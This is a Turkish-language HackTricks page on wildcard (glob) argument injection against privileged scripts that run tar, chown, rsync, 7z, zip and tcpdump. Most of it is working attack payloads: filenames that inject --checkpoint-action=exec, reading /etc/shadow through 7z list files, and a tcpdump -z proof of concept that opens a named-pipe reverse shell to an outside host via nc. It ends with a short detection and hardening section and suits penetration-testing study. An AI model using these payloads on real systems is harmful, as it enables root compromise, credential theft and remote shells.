# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argüman enjeksiyonu**, ayrıcalıklı bir betik `tar`, `chown`, `rsync`, `zip`, `7z`, … gibi bir Unix ikili dosyasını, tırnak işareti olmadan bir joker karakterle `*` çalıştırdığında gerçekleşir. 
> Shell, joker karakteri **ikili dosyayı çalıştırmadan önce** genişlettiğinden, çalışma dizininde dosya oluşturabilen bir saldırgan, `-` ile başlayan dosya adları oluşturabilir, böylece bunlar **veri yerine seçenekler** olarak yorumlanır ve etkili bir şekilde rastgele bayraklar veya hatta komutlar gizlenebilir. 
> Bu sayfa, 2023-2025 için en yararlı ilkelere, son araştırmalara ve modern tespitlere dair bilgileri toplar.

## chown / chmod

`--reference` bayrağını kötüye kullanarak **rastgele bir dosyanın sahibi/grubu veya izin bitlerini kopyalayabilirsiniz**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kök daha sonra şöyle bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` enjekte edilir, bu da `/root/secret``file`'ın sahiplik/izinlerini *tüm* eşleşen dosyaların miras almasına neden olur.

*PoC & araç*: [`wildpwn`](https://github.com/localh0t/wildpwn) (birleşik saldırı).
Ayrıca detaylar için klasik DefenseCode makalesine bakın.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** özelliğini kötüye kullanarak rastgele komutlar çalıştırın:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bir kez root çalıştırdığında e.g. `tar -czf /root/backup.tgz *`, `shell.sh` root olarak çalıştırılır.

### bsdtar / macOS 14+

Son macOS'taki varsayılan `tar` (`libarchive` tabanlı) `--checkpoint`'i *uygulamaz*, ancak dış bir sıkıştırıcı belirtmenize olanak tanıyan **--use-compress-program** bayrağı ile kod yürütme elde edebilirsiniz.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Bir ayrıcalıklı betik `tar -cf backup.tar *` çalıştırdığında, `/bin/sh` başlatılacaktır.

---

## rsync

`rsync`, uzaktan kabuğu veya hatta uzaktan ikili dosyayı `-e` veya `--rsync-path` ile başlayan komut satırı bayrakları aracılığıyla geçersiz kılmanıza olanak tanır:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Eğer root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen bayrak uzaktaki tarafınızda shell'inizi başlatır.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modu).

---

## 7-Zip / 7z / 7za

Ayrıca, ayrıcalıklı script *savunmacı* bir şekilde joker karakteri `--` ile öne eklese bile (seçenek ayrıştırmasını durdurmak için), 7-Zip formatı **dosya liste dosyalarını** dosya adını `@` ile öne ekleyerek destekler. Bunu bir symlink ile birleştirmek, *rastgele dosyaları dışarı sızdırmanıza* olanak tanır:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Eğer root, şöyle bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (→ `/etc/shadow`) bir dosya listesi olarak okumaya çalışacak ve çıkacaktır, **içeriği stderr'ye yazdıracaktır**.

---

## zip

`zip`, arşiv test edileceği zaman sistem kabuğuna *kelimesi kelimesine* iletilen `--unzip-command` bayrağını destekler:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Ekstra ikili dosyalar için wildcard enjeksiyonuna karşı hassasiyet (2023-2025 hızlı listesi)

Aşağıdaki komutlar modern CTF'lerde ve gerçek ortamlarda kötüye kullanılmıştır. Payload her zaman daha sonra bir wildcard ile işlenecek yazılabilir bir dizin içinde bir *dosya adı* olarak oluşturulur:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Dosya içeriğini oku |
| `flock` | `-c <cmd>` | Komutu çalıştır |
| `git`   | `-c core.sshCommand=<cmd>` | SSH üzerinden git ile komut çalıştırma |
| `scp`   | `-S <cmd>` | ssh yerine keyfi bir program başlat |

Bu primitifler *tar/rsync/zip* klasiklerinden daha az yaygındır ama avlanırken kontrol edilmeye değer.

---

## tcpdump döngü kancaları (-G/-W/-z): argv enjeksiyonu ile RCE

Kısıtlı bir shell veya satıcı sargısı, kullanıcı kontrolündeki alanları (örneğin, "dosya adı" parametresi) katlayarak bir `tcpdump` komut satırı oluşturduğunda, ekstra `tcpdump` bayraklarını gizlice sokabilirsiniz. `-G` (zaman tabanlı döngü), `-W` (dosya sayısını sınırlama) ve `-z <cmd>` (döngü sonrası komut) kombinasyonu, tcpdump'ı çalıştıran kullanıcı olarak keyfi komut çalıştırma sağlar (genellikle cihazlarda root).

Ön koşullar:

- `tcpdump`'a geçirilen `argv`'yi etkileyebilirsiniz (örneğin, `/debug/tcpdump --filter=... --file-name=<HERE>` aracılığıyla).
- Sargı, dosya adı alanındaki boşlukları veya `-` ile başlayan token'ları temizlemez.

Klasik PoC (yazılabilir bir yoldan ters shell scripti çalıştırır):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detaylar:

- `-G 1 -W 1` ilk eşleşen paket sonrası hemen döndürmeyi zorlar.
- `-z <cmd>` her döngüde bir kez post-rotate komutunu çalıştırır. Birçok yapı `<cmd> <savefile>` şeklinde çalıştırır. Eğer `<cmd>` bir script/yorumlayıcı ise, argüman işleme yükleminizle eşleştiğinden emin olun.

Kaldırılamayan medya varyantları:

- Dosya yazmak için başka bir ilkeliniz varsa (örneğin, çıktı yönlendirmesine izin veren ayrı bir komut sarmalayıcı), scriptinizi bilinen bir yola bırakın ve platform anlamına bağlı olarak `-z /bin/sh /path/script.sh` veya `-z /path/script.sh` komutunu tetikleyin.
- Bazı satıcı sarmalayıcıları, saldırganın kontrol edebileceği konumlara döner. Eğer döndürülen yolu etkileyebiliyorsanız (sembolik bağlantı/dizin geçişi), `-z`'yi tamamen kontrol ettiğiniz içeriği çalıştıracak şekilde yönlendirebilirsiniz.

Satıcılar için sertleştirme ipuçları:

- Kullanıcı kontrolündeki dizeleri `tcpdump`'a (veya herhangi bir araca) doğrudan geçmeyin, sıkı izin listeleri olmadan. Alıntı yapın ve doğrulayın.
- Sarmalayıcılarda `-z` işlevselliğini açığa çıkarmayın; tcpdump'ı sabit güvenli bir şablonla çalıştırın ve ek bayrakları tamamen yasaklayın.
- tcpdump ayrıcalıklarını düşürün (sadece cap_net_admin/cap_net_raw) veya AppArmor/SELinux kısıtlaması ile ayrıcalıksız bir kullanıcı altında çalıştırın.

## Tespit & Sertleştirme

1. **Kritik scriptlerde shell globbing'i devre dışı bırakın**: `set -f` (`set -o noglob`) joker karakter genişlemesini engeller.
2. **Argümanları alıntılayın veya kaçırın**: `tar -czf "$dst" -- *` *güvenli değildir* — `find . -type f -print0 | xargs -0 tar -czf "$dst"` kullanmayı tercih edin.
3. **Açık yollar**: `*` yerine `/var/www/html/*.log` kullanın, böylece saldırganlar `-` ile başlayan kardeş dosyalar oluşturamaz.
4. **En az ayrıcalık**: Yedekleme/bakım işlerini mümkün olduğunca root yerine ayrıcalıksız bir hizmet hesabı olarak çalıştırın.
5. **İzleme**: Elastic’in önceden oluşturulmuş kuralı *Wildcard Injection ile Potansiyel Shell* `tar --checkpoint=*`, `rsync -e*` veya `zip --unzip-command` ile hemen ardından bir shell çocuk süreci arar. EQL sorgusu diğer EDR'ler için uyarlanabilir.

---

## Referanslar

* Elastic Security – Potansiyel Shell ile Wildcard Injection Tespit Edildi kuralı (son güncelleme 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (18 Aralık 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
